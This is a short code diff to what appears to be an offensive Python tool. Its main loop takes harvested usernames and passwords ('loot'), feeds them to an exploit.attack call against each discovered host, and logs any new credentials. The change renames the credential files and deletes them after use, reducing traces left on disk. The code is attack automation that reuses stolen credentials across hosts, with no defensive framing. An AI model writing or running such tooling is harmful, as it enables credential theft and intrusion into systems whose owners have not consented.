@@ -85,15 +85,16 @@ def main():
     for host in host_openings:
         found_usernames, found_passwords = zip(*get_logged_loot())
         found_usernames = [x for x in found_usernames if x]
-        with open('data/found_usernames.txt', 'w') as f:
+        with open('data/usernames_cache.txt', 'w') as f:
             for username in found_usernames:
                 f.write('%s\n' % username)
         found_passwords = [x for x in found_passwords if x]
-        with open('data/found_passwords.txt', 'w') as f:
+        with open('data/passwords_cache.txt', 'w') as f:
             for passwords in found_passwords:
                 f.write('%s\n' % passwords)
-        new_loot = exploit.attack(host, 'data/found_usernames.txt', 'data/found_passwords.txt')
-        
+        new_loot = exploit.attack(host, 'data/usernames_cache.txt', 'data/passwords_cache.txt')
+        os.remove('data/usernames_cache.txt')
+        os.remove('data/passwords_cache.txt')
         if new_loot:
             log_loot(new_loot, args.output)
 
